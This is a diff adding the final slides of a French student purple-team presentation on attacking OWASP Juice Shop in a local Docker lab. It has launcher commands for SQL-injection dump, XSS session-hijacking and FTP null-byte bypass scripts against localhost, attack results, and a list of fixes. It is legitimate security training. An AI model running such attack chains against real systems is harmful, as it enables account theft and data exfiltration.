+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+            <div class="stat" style="padding:14px"><div class="stat-n" style="font-size:28px;color:var(--blue)">9/16</div><div class="stat-l">Tests Purple</div></div>
+            <div class="stat" style="padding:14px"><div class="stat-n" style="font-size:28px;color:var(--orange)">56%</div><div class="stat-l">Score WAF</div></div>
+          </div>
+          <div class="card-blue card" style="padding:12px 16px">
+            <div class="eyebrow" style="color:var(--blue);margin-bottom:6px">Faux positifs détectés</div>
+            <div class="sub" style="font-size:12px;line-height:1.7">Review légitime bloquée (WAF-004 trop large)<br>Apostrophe naturelle bloquée (<code style="font-family:var(--mono)">it's</code> → HTTP 500)</div>
+          </div>
+          <div class="card-red card" style="padding:12px 16px">
+            <div class="eyebrow" style="color:var(--red);margin-bottom:6px">Manquant</div>
+            <div class="sub" style="font-size:12px;line-height:1.7">Rate limiting login inactif<br>Header CSP absent<br>Routing proxy WAF-001/003</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       SLIDE 9 — DÉMO (lanceur)
+  ═══════════════════════════════════════════════════════════════ -->
+  <div class="slide" id="s9">
+    <div style="max-width:820px;width:100%">
+      <div class="eyebrow">Démonstrations live · Environnement lab Docker</div>
+      <h2 class="h2" style="margin-bottom:24px">Lancer les démos</h2>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+
+        <!-- Démo 1 : SQLi dump -->
+        <div class="card" style="padding:20px">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px">
+            <div>
+              <div class="eyebrow" style="margin-bottom:4px;color:var(--red)">Démo 1 · Red Team</div>
+              <div class="h3">SQLi — Dump Users</div>
+            </div>
+            <span class="badge b-red">VULN-01</span>
+          </div>
+          <div class="terminal" style="margin-bottom:14px">
+            <div class="term-bar"><div class="term-dot" style="background:#e05555"></div><div class="term-dot" style="background:#e0a030"></div><div class="term-dot" style="background:#3db87a"></div><span style="font-size:11px;color:var(--text-muted);margin-left:8px">kali@lab:~</span></div>
+            <div class="term-body" style="font-size:11px">
+              <span style="color:var(--green)">python3</span> juiceshop_auto.py<br>
+              &nbsp;&nbsp;--action sqli<br>
+              &nbsp;&nbsp;--target http://localhost:3000
+            </div>
+          </div>
+          <button class="demo-btn" style="width:100%;justify-content:center;font-size:13px;padding:11px 20px" onclick="copyCmd('python3 juiceshop_auto.py --action sqli --target http://localhost:3000')">
+            📋 Copier la commande
+          </button>
+        </div>
+
+        <!-- Démo 2 : XSS Hijack -->
+        <div class="card" style="padding:20px">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px">
+            <div>
+              <div class="eyebrow" style="margin-bottom:4px;color:var(--orange)">Démo 2 · Exploit Chain</div>
+              <div class="h3">XSS + Session Hijacking</div>
+            </div>
+            <span class="badge b-orange">VULN-05</span>
+          </div>
+          <div class="terminal" style="margin-bottom:14px">
+            <div class="term-bar"><div class="term-dot" style="background:#e05555"></div><div class="term-dot" style="background:#e0a030"></div><div class="term-dot" style="background:#3db87a"></div><span style="font-size:11px;color:var(--text-muted);margin-left:8px">kali@lab:~</span></div>
+            <div class="term-body" style="font-size:11px">
+              <span style="color:var(--green)">python3</span> demo_xss_hijack.py<br>
+              &nbsp;&nbsp;--target http://localhost:3000<br>
+              &nbsp;&nbsp;--auto
+            </div>
+          </div>
+          <button class="demo-btn" style="width:100%;justify-content:center;font-size:13px;padding:11px 20px" onclick="copyCmd('python3 demo_xss_hijack.py --target http://localhost:3000 --auto')">
+            📋 Copier la commande
+          </button>
+        </div>
+
+        <!-- Démo 3 : Purple Team -->
+        <div class="card" style="padding:20px">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px">
+            <div>
+              <div class="eyebrow" style="margin-bottom:4px;color:var(--purple)">Démo 3 · Purple Team</div>
+              <div class="h3">Validation défenses WAF</div>
+            </div>
+            <span class="badge b-purple">16 tests</span>
+          </div>
+          <div class="terminal" style="margin-bottom:14px">
+            <div class="term-bar"><div class="term-dot" style="background:#e05555"></div><div class="term-dot" style="background:#e0a030"></div><div class="term-dot" style="background:#3db87a"></div><span style="font-size:11px;color:var(--text-muted);margin-left:8px">kali@lab:~</span></div>
+            <div class="term-body" style="font-size:11px">
+              <span style="color:var(--green)">python3</span> purple_team_validation.py<br>
+              &nbsp;&nbsp;--waf http://localhost:8081<br>
+              &nbsp;&nbsp;--raw http://localhost:3000
+            </div>
+          </div>
+          <button class="demo-btn demo-btn-blue" style="width:100%;justify-content:center;font-size:13px;padding:11px 20px" onclick="copyCmd('python3 purple_team_validation.py --waf http://localhost:8081 --raw http://localhost:3000')">
+            📋 Copier la commande
+          </button>
+        </div>
+
+        <!-- Démo 4 : FTP Bypass -->
+        <div class="card" style="padding:20px">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px">
+            <div>
+              <div class="eyebrow" style="margin-bottom:4px;color:var(--orange)">Démo 4 · Red Team</div>
+              <div class="h3">FTP Null Byte Bypass</div>
+            </div>
+            <span class="badge b-orange">VULN-04</span>
+          </div>
+          <div class="terminal" style="margin-bottom:14px">
+            <div class="term-bar"><div class="term-dot" style="background:#e05555"></div><div class="term-dot" style="background:#e0a030"></div><div class="term-dot" style="background:#3db87a"></div><span style="font-size:11px;color:var(--text-muted);margin-left:8px">kali@lab:~</span></div>
+            <div class="term-body" style="font-size:11px">
+              <span style="color:var(--green)">python3</span> juiceshop_auto.py<br>
+              &nbsp;&nbsp;--action bypass<br>
+              &nbsp;&nbsp;--target http://localhost:3000
+            </div>
+          </div>
+          <button class="demo-btn demo-btn-green" style="width:100%;justify-content:center;font-size:13px;padding:11px 20px" onclick="copyCmd('python3 juiceshop_auto.py --action bypass --target http://localhost:3000')">
+            📋 Copier la commande
+          </button>
+        </div>
+
+      </div>
+      <div id="copy-toast" style="display:none;position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:var(--green-dim);border:1px solid var(--green-border);color:var(--green);padding:8px 20px;border-radius:8px;font-family:var(--mono);font-size:12px">✓ Commande copiée dans le presse-papiers</div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       SLIDE 10 — CONCLUSION
+  ═══════════════════════════════════════════════════════════════ -->
+  <div class="slide" id="s10">
+    <div style="max-width:820px;width:100%;text-align:center">
+      <div class="eyebrow">Bilan Purple Team · OWASP Juice Shop</div>
+      <h2 class="h2" style="margin-bottom:8px">Accès admin complet en &lt; 30 minutes</h2>
+      <p class="sub" style="margin-bottom:28px">5 vulnérabilités enchaînées · base de données exfiltrée · session hijacking démontré en live</p>
+
+      <div style="display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-bottom:28px">
+        <div class="stat"><div class="stat-n" style="font-size:24px;color:var(--red)">2</div><div class="stat-l">Critiques</div></div>
+        <div class="stat"><div class="stat-n" style="font-size:24px;color:var(--orange)">3</div><div class="stat-l">Hautes</div></div>
+        <div class="stat"><div class="stat-n" style="font-size:24px;color:var(--green)">22</div><div class="stat-l">Comptes</div></div>
+        <div class="stat"><div class="stat-n" style="font-size:24px;color:var(--blue)">56%</div><div class="stat-l">WAF score</div></div>
+        <div class="stat"><div class="stat-n" style="font-size:24px;color:var(--purple)">5</div><div class="stat-l">Scripts auto</div></div>
+      </div>
+
+      <div style="text-align:left;display:flex;flex-direction:column;gap:8px;margin-bottom:24px">
+        <div class="eyebrow" style="text-align:left;margin-bottom:4px;color:var(--green)">Top 5 actions correctives — priorité décroissante</div>
+        <div style="display:flex;gap:10px;align-items:center;padding:10px 16px;background:var(--surface2);border-radius:8px;border:1px solid var(--border)">
+          <span class="mono" style="color:var(--green);min-width:20px">01</span>
+          <span style="font-size:13px">Requêtes préparées (ORM) sur <code style="font-family:var(--mono);font-size:11px;background:var(--surface);padding:1px 5px;border-radius:3px">/search</code> et <code style="font-family:var(--mono);font-size:11px;background:var(--surface);padding:1px 5px;border-radius:3px">/login</code> — élimine SQLi à la source</span>
+        </div>
+        <div style="display:flex;gap:10px;align-items:center;padding:10px 16px;background:var(--surface2);border-radius:8px;border:1px solid var(--border)">
+          <span class="mono" style="color:var(--green);min-width:20px">02</span>
+          <span style="font-size:13px">JWT en cookie <code style="font-family:var(--mono);font-size:11px;background:var(--surface);padding:1px 5px;border-radius:3px">HttpOnly; Secure</code> + CSP <code style="font-family:var(--mono);font-size:11px;background:var(--surface);padding:1px 5px;border-radius:3px">script-src 'self'</code> — élimine XSS token theft</span>
+        </div>
+        <div style="display:flex;gap:10px;align-items:center;padding:10px 16px;background:var(--surface2);border-radius:8px;border:1px solid var(--border)">
+          <span class="mono" style="color:var(--green);min-width:20px">03</span>
+          <span style="font-size:13px">Remplacer MD5 par bcrypt (coût 12) ou Argon2id — rend le crack impossible en temps raisonnable</span>
+        </div>
+        <div style="display:flex;gap:10px;align-items:center;padding:10px 16px;background:var(--surface2);border-radius:8px;border:1px solid var(--border)">
+          <span class="mono" style="color:var(--green);min-width:20px">04</span>
+          <span style="font-size:13px">Vérification ownership serveur sur chaque ressource (<code style="font-family:var(--mono);font-size:11px;background:var(--surface);padding:1px 5px;border-radius:3px">token.userId === resourceId</code>) — corrige IDOR</span>
+        </div>
+        <div style="display:flex;gap:10px;align-items:center;padding:10px 16px;background:var(--surface2);border-radius:8px;border:1px solid var(--border)">
+          <span class="mono" style="color:var(--green);min-width:20px">05</span>
+          <span style="font-size:13px">Normalisation URI avant validation d'extension sur <code style="font-family:var(--mono);font-size:11px;background:var(--surface);padding:1px 5px;border-radius:3px">/ftp/</code> — élimine le bypass %2500</span>
+        </div>
+      </div>
+
+      <div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap">
+        <span class="member">ANANI Georges Lionel</span>
+        <span class="member">KOUAME Marc</span>
+        <span class="member">SELLAK Mohammed</span>
+        <span class="member">OUBENAZHA Rachid</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── NAV ─────────────────────────────────────────────────────── -->
+  <div class="nav">
+    <div class="dots" id="dots"></div>
+    <div class="btns">
+      <button class="btn" onclick="go(-1)">← Précédent</button>
+      <span class="slide-num" id="snum">1 / 11</span>
+      <button class="btn" onclick="go(1)">Suivant →</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const slides = document.querySelectorAll('.slide');
+const total  = slides.length;
+let cur = 0, locked = false;
+
+// dots
+const dotsEl = document.getElementById('dots');
+slides.forEach((_,i)=>{
+  const d = document.createElement('button');
+  d.className = 'dot' + (i===0?' on':'');
+  d.onclick = ()=>goTo(i);
+  dotsEl.appendChild(d);
+});
+
+function updateUI(){
+  document.querySelectorAll('.dot').forEach((d,i)=>d.classList.toggle('on',i===cur));
+  document.getElementById('snum').textContent = (cur+1)+' / '+total;
+  document.getElementById('prog').style.width = ((cur+1)/total*100)+'%';
+}
+
+function goTo(n){
+  if(locked) return;
+  locked = true;
+  slides[cur].classList.remove('active');
+  slides[cur].classList.add('out');
+  setTimeout(()=>{ slides[cur].classList.remove('out'); }, 500);
+  cur = (n+total)%total;
+  setTimeout(()=>{ slides[cur].classList.add('active'); updateUI(); locked=false; }, 50);
+}
+
+function go(d){ goTo(cur+d); }
+
+document.addEventListener('keydown', e=>{
+  if(e.key==='ArrowRight'||e.key===' '){ e.preventDefault(); go(1); }
+  if(e.key==='ArrowLeft'){ e.preventDefault(); go(-1); }
+  if(e.key==='Home') goTo(0);
+  if(e.key==='End')  goTo(total-1);
+  // Raccourcis démo : touches 1-4 pour aller à la slide démo
+  if(e.key==='d'||e.key==='D') goTo(9);
+});
+
+updateUI();
+
+// Copy command
+function copyCmd(cmd){
+  navigator.clipboard.writeText(cmd).then(()=>{
+    const t = document.getElementById('copy-toast');
+    t.style.display = 'block';
+    setTimeout(()=>{ t.style.display='none'; }, 2200);
+  });
+}
+</script>
+</body>
+</html>
